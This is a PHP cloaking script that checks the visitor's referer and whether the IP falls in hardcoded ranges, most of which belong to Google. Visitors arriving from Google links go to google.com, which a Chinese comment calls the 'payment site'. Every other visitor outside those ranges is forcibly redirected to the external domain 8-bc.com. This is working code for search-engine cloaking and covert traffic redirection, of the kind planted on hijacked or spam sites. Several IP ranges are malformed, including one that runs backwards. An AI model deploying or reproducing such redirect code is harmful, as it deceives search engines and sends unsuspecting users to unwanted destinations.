<?php 
error_reporting(0);
$url='http://www.google.com/'; //如果是谷歌点击则跳转至收款站，
$str=strpos($_SERVER['HTTP_REFERER'],'google');
if($str){
    header("location:{$url}");
    exit();
}

//$localIp = '202.160.176.12';
$localIp= $_SERVER["REMOTE_ADDR"];
$ipRanges = array( array( '108.170.192.0' , '108.170.255.255' ), array( '123.205.250.68' , '123.205.251.123' ),  array( '163.28.83.187','163.28.161.1' ), array( '108.177.0.0' , '108.177.127.255' ), array( '202.39.143.1' , '202.39.143.123' ), array( '202.39.143.1' , '203.211.0.4' ), array( '203.211.0.59' , '142.251.255.255' ), array( '172.217.0.0' , '172.217.255.255' ), array( '172.253.0.0' , '172.253.255.255' ), array( '203.66.124.129' , '203.66.124.251' ), array( '210.61.221.65' , '210.61.221.255' ), array( '60.199.175.1' , '60.199.175.255' ), array( '61.219.131.65' , '61.219.131.255' ), array( '173.194.0.0' , '173.194.255.255' ), array( '192.168.111.10' , '192.168.111.255'), array( '192.178.0.0' , '192.179.255.255' ), array( '199.87.240.0' , '199.87.243.255' ), array( '207.126.144.0' , '207.126.159.255' ), array( '207.223.160.0' , '207.223.175.255' ), array( '209.185.0.0' , '209.185.255.255' ), array( '209.85.128.0' , '209.85.255.255' ), array( '216.239.32.0' , '216.239.63.255' ), array( '216.32.0.0' , '216.35.255.255' ), array( '216.58.192.0' , '216.58.223.255' ), array( '64.18.0.0' , '64.18.15.255' ), array( '64.233.160.0' , '64.233.191.255' ), array( '64.68.64.0' , '64.68.95.255' ), array( '66.102.0.0' , '66.102.15.255' ), array( '66.249.64.0' , '66.249.95.255' ), array( '70.32.128.0' , '70.32.159.255' ), array( '70.88.0.0' , '70.91.255.255' ), array( '72.14.192.0' , '72.14.255.255' ), array( '74.125.0.0' , '74.125.255.255' ), array( '8.0.0.0' , '8.255.255.255' ), array( '128.177.109.64' , '128.177.109.255' ), array( '128.177.174.32' , '128.177.174.47' ), array( '206.186.137.128' , '206.186.137.191' ), array( '206.47.187.168' , '206.47.187.175' ), array( '207.35.69.192' , '207.35.69.255' ), array( '208.74.177.144' , '208.74.177.159' ), array( '209.249.73.64' , '209.249.73.71' ), array( '63.84.190.224' , '63.84.190.255' ), array( '64.119.136.224' , '64.119.136.231' ), array( '64.124.112.24' , '64.124.112.31' ), array( '64.124.229.168' , '64.124.229.175' ), array( '64.128.207.160' , '64.128.207.175' ), array( '64.17.244.0' , '64.17.244.31' ), array( '65.196.235.32' , '65.196.235.47' ), array( '65.211.194.96' , '65.211.194.111' ), array( '65.214.112.96' , '65.214.112.127' ), array( '65.214.255.96' , '65.214.255.111' ), array( '65.221.133.176' , '65.221.133.191' ), array( '65.223.8.48' , '65.223.8.63' ), array( '66.192.134.32' , '66.192.134.47' ), array( '67.126.100.8' , '67.126.100.15' ), array( '70.90.219.48' , '70.90.219.55' ), array( '70.90.219.72' , '70.90.219.79'));
    
$is_or_no = is_ip($localIp,$ipRanges);

if($is_or_no == "")
{
   header("location:http://www.8-bc.com/");
}
    
function is_ip($localIp,$ipRanges) {
  $localIp = ip2long($localIp);
  foreach($ipRanges as $val) {
     if($localIp >= ip2long($val[0]) && $localIp <= ip2long($val[1])) {
       return $val;
      }
  }
 return false;
}
?>